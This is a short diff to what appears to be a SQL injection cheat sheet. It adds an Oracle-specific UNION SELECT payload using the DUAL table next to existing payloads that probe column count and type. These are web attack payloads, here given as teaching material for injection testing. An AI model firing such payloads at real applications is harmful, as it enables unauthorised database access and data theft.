@@ -82,6 +82,8 @@ DUAL is an oracle inbuilt table present in the database
 ' UNION SELECT NULL,'a',NULL,NULL-- 
 ' UNION SELECT NULL,NULL,'a',NULL-- 
 ' UNION SELECT NULL,NULL,NULL,'a'--
+' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL-- 
+(last one for oracle only and same logic as the above ones)
 
 etc...
 ```
